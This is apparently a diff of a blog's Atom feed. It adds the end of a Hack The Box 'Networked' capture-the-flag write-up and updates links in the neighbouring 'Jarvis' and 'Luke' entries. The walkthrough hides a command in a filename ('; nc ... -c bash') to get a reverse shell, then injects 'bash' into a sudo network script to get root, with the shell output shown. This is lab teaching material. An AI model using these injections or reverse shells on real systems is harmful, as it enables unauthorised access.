+&lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$files&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'index.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;#echo &quot;-------------\n&quot;;
+&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;#print &quot;check: $value\n&quot;;
+&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;list&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getnameCheck&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$check&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;check_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;attack!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# todo: attach file
+&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$logpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;FILE_APPEND&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;LOCK_EX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rm -f &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$logpath&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;nohup /bin/rm -f &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$path$value&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;rm -f &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$path$value&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$to&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;-F&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$value&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+bash-4.2$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;This script checks for files that aren’t supposed to be in the uploads directory and deletes them, the interesting part is how it deletes the files, it appends the file name to the &lt;code class=&quot;highlighter-rouge&quot;&gt;rm&lt;/code&gt; command without any filtering which makes it vulnerable to command injection:&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;nohup /bin/rm -f &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$path$value&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$path&lt;/code&gt; is the path of the uploads directory:&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/var/www/html/uploads/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;And &lt;code class=&quot;highlighter-rouge&quot;&gt;$value&lt;/code&gt; is the suspicious file’s name.
+&lt;br /&gt;We can simply go to &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/uploads&lt;/code&gt; and create a file that holds the payload in its name. The name will start with a semicolon &lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt; (to inject the new command) then the reverse shell command.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.2$ cd /var/www/html/uploads
+bash-4.2$ touch '; nc 10.10.xx.xx 1338 -c bash'
+bash-4.2$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;After some time I got a shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;guly&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/networked# nc -lvnp 1338
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::1338
+Ncat: Listening on 0.0.0.0:1338
+Ncat: Connection from 10.10.10.146.
+Ncat: Connection from 10.10.10.146:60812.
+whoami
+guly
+python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+[guly@networked ~]$ ^Z
+[1]+  Stopped                 nc -lvnp 1338
+root@kali:~/Desktop/HTB/boxes/networked# stty raw -echo 
+root@kali:~/Desktop/HTB/boxes/networked# nc -lvnp 1338
+
+[guly@networked ~]$ export TERM=screen
+[guly@networked ~]$ id
+uid=1000(guly) gid=1000(guly) groups=1000(guly)
+[guly@networked ~]$ ls -al
+total 32
+drwxr-xr-x. 2 guly guly  178 Nov 16 00:31 .
+drwxr-xr-x. 3 root root   18 Jul  2 13:27 ..
+lrwxrwxrwx. 1 root root    9 Jul  2 13:35 .bash_history -&amp;gt; /dev/null
+-rw-r--r--. 1 guly guly   18 Oct 30  2018 .bash_logout
+-rw-r--r--. 1 guly guly  193 Oct 30  2018 .bash_profile
+-rw-r--r--. 1 guly guly  231 Oct 30  2018 .bashrc
+-r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php
+-rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly
+-rw-------  1 guly guly 3072 Nov 16 00:48 dead.letter
+-r--------. 1 guly guly   33 Oct 30  2018 user.txt
+-rw-------  1 guly guly  749 Nov 16 00:31 .viminfo
+[guly@networked ~]$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/networked/13.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;We owned user.
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;command-injection-in-the-network-script-name--root-shell--root-flag&quot;&gt;Command Injection in the Network Script Name –&amp;gt; Root Shell –&amp;gt; Root Flag&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;As &lt;code class=&quot;highlighter-rouge&quot;&gt;guly&lt;/code&gt; I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; and found that &lt;code class=&quot;highlighter-rouge&quot;&gt;guly&lt;/code&gt; can run &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/sbin/changename.sh&lt;/code&gt; as root without a password:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[guly@networked ~]$ sudo -l
+Matching Defaults entries for guly on networked:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;,
+    env_keep+=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;,
+    env_keep+=&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;,
+    env_keep+=&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;,
+    env_keep+=&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;,
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User guly may run the following commands on networked:
+    (root) NOPASSWD: /usr/local/sbin/changename.sh
+[guly@networked ~]$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;changename.sh&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;guly@networked ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/local/sbin/changename.sh
+&lt;span class=&quot;c&quot;&gt;#!/bin/bash -p&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;EoF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EoF
+
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;regexp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;^[a-zA-Z0-9_&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/-]+$&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;var &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;interface &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&quot;&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;x
+        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;~ &lt;span class=&quot;nv&quot;&gt;$regexp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+                &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;wrong input, try again&quot;&lt;/span&gt;
+                &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;interface &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&quot;&lt;/span&gt;
+                &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;x
+        &lt;span class=&quot;k&quot;&gt;done
+        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/sysconfig/network-scripts/ifcfg-guly
+&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+
+/sbin/ifup guly0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;guly@networked ~]&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;This script simply creates a network script for an interface called &lt;code class=&quot;highlighter-rouge&quot;&gt;guly&lt;/code&gt; then activates that interface. It asks the user for these options: &lt;code class=&quot;highlighter-rouge&quot;&gt;NAME&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;PROXY_METHOD&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;BROWSER_ONLY&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;BOOTPROTO&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
+interface NAME:
+test
+interface PROXY_METHOD:
+test
+interface BROWSER_ONLY:
+test
+interface BOOTPROTO:
+test
+ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We’re only interested in the &lt;code class=&quot;highlighter-rouge&quot;&gt;NAME&lt;/code&gt; option because according to &lt;a href=&quot;https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;amp;qid=e026a0c5f83df4fd532442e1324ffa4f&quot;&gt;this page&lt;/a&gt; we can inject commands in the interface name.  Let’s try to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;bash&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
+interface NAME:
+test bash
+interface PROXY_METHOD:
+test
+interface BROWSER_ONLY:
+test
+interface BOOTPROTO:
+test
+[root@networked network-scripts]# whoami
+root
+[root@networked network-scripts]# id
+uid=0(root) gid=0(root) groups=0(root)
+[root@networked network-scripts]# cd /root/
+[root@networked ~]# ls -la
+total 28
+dr-xr-x---.  2 root root  144 Jul 15 11:34 .
+dr-xr-xr-x. 17 root root  224 Jul  2 13:27 ..
+lrwxrwxrwx.  1 root root    9 Jul  2 13:35 .bash_history -&amp;gt; /dev/null
+-rw-r--r--.  1 root root   18 Dec 29  2013 .bash_logout
+-rw-r--r--.  1 root root  176 Dec 29  2013 .bash_profile
+-rw-r--r--.  1 root root  176 Dec 29  2013 .bashrc
+-rw-r--r--.  1 root root  100 Dec 29  2013 .cshrc
+-r--------.  1 root root   33 Oct 30  2018 root.txt
+-rw-r--r--.  1 root root  129 Dec 29  2013 .tcshrc
+-rw-------   1 root root 1011 Jul 15 11:34 .viminfo
+[root@networked network-scripts]#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;And we got a root shell.&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/networked/14.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;We owned root !
+&lt;br /&gt;That’s it , Feedback is appreciated !
+&lt;br /&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;
+&lt;br /&gt;Thanks for reading.
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/jarvis/&quot;&gt;Hack The Box - Jarvis&lt;/a&gt;&lt;/p&gt;
+&lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="web" /><category term="rce" /><category term="php" /><category term="sudo" /><category term="networking" /><summary type="html">Quick Summary Hey guys, today Networked retired and here’s my write-up about it. It was a quick fun machine with an RCE vulnerability and a couple of command injection vulnerabilities. It’s a Linux box and its ip is 10.10.10.146, I added it to /etc/hosts as networked.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services: ``` root@kali:~/Desktop/HTB/boxes/networked# nmap -sV -sT -sC -o nmapinitial networked.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-16 01:16 EET Nmap scan report for networked.htb (10.10.10.146) Host is up (1.7s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA) | 256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA) |_ 256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Site doesn’t have a title (text/html; charset=UTF-8). 443/tcp closed https</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/networked/0.png" /></entry><entry><title type="html">Hack The Box - Jarvis</title><link href="https://0xrick.github.io/hack-the-box/jarvis/" rel="alternate" type="text/html" title="Hack The Box - Jarvis" /><published>2019-11-09T00:00:00+02:00</published><updated>2019-11-09T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/jarvis</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/jarvis/">&lt;hr /&gt;
 
 &lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
 &lt;p&gt;&lt;br /&gt;Hey guys, today Jarvis retired and here’s my write-up about it. It was a nice easy box with a web application vulnerable to &lt;code class=&quot;highlighter-rouge&quot;&gt;SQL&lt;/code&gt; injection, a python script vulnerable to command injection and a setuid binary that could be abused to get a root shell. It’s a medium box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.143&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;jarvis.htb&lt;/code&gt;. Let’s jump right in!
@@ -822,7 +1420,8 @@ root@jarvis:~#
 &lt;br /&gt;Thanks for reading.
 &lt;br /&gt;
 &lt;br /&gt;
-&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/haystack/&quot;&gt;Hack The Box - Haystack&lt;/a&gt;&lt;/p&gt;
+&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/haystack/&quot;&gt;Hack The Box - Haystack&lt;/a&gt;
+&lt;br /&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/networked/&quot;&gt;Hack The Box - Networked&lt;/a&gt;&lt;/p&gt;
 &lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="web" /><category term="sqli" /><category term="rce" /><category term="php" /><category term="python" /><category term="suid" /><summary type="html">Quick Summary Hey guys, today Jarvis retired and here’s my write-up about it. It was a nice easy box with a web application vulnerable to SQL injection, a python script vulnerable to command injection and a setuid binary that could be abused to get a root shell. It’s a medium box and its ip is 10.10.10.143, I added it to /etc/hosts as jarvis.htb. Let’s jump right in! Nmap As always we will start with nmap to scan for open ports and services: ``` root@kali:~/Desktop/HTB/boxes/jarvis# nmap -sV -sT -sC -o nmapinitial jarvis.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-08 17:33 EET Nmap scan report for jarvis.htb (10.10.10.143) Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA) | 256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA) |_ 256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Stark Hotel Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/jarvis/0.png" /></entry><entry><title type="html">Hack The Box - Haystack</title><link href="https://0xrick.github.io/hack-the-box/haystack/" rel="alternate" type="text/html" title="Hack The Box - Haystack" /><published>2019-11-02T00:00:00+02:00</published><updated>2019-11-02T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/haystack</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/haystack/">&lt;hr /&gt;
 
 &lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
@@ -5583,209 +6182,4 @@ Forbidden
 &lt;br /&gt;
 &lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/bastion/&quot;&gt;Hack The Box - Bastion&lt;/a&gt;
 &lt;br /&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/kryptos/&quot;&gt;Hack The Box - Kryptos&lt;/a&gt;&lt;/p&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="bsd" /><category term="web" /><summary type="html">Quick Summary Hey guys today Luke retired and here’s my write-up about it. It was an easy machine, all you need to do is to enumerate well and you’ll find what you need. It’s a FreeBSD box and its ip is 10.10.10.137, I added it to /etc/hosts as luke.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : ``` root@kali:~/Desktop/HTB/boxes/luke# nmap -sV -sT -sC -o nmapinitial luke.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-13 12:57 EET Nmap scan report for luke.htb (10.10.10.137) Host is up (0.23s latency). Not shown: 995 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3+ (ext.1) | ftp-anon: Anonymous FTP login allowed (FTP code 230) |drwxr-xr-x 2 0 0 512 Apr 14 12:35 webapp | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.xx.xx | Logged in as ftp | TYPE: ASCII | No session upload bandwidth limit | No session download bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3+ (ext.1) - secure, fast, stable |_End of status 22/tcp open ssh? 80/tcp open http Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3) | http-methods: | Potentially risky methods: TRACE |_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3 |_http-title: Luke 3000/tcp open http Node.js Express framework |_http-title: Site doesn’t have a title (application/json; charset=utf-8). 8000/tcp open http Ajenti http control panel |_http-title: Ajenti</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/luke/0.png" /></entry><entry><title type="html">Hack The Box - Bastion (Commando)</title><link href="https://0xrick.github.io/hack-the-box/bastion-2/" rel="alternate" type="text/html" title="Hack The Box - Bastion (Commando)" /><published>2019-09-07T00:00:00+02:00</published><updated>2019-09-07T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/bastion-2</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/bastion-2/">&lt;hr /&gt;
-
-&lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
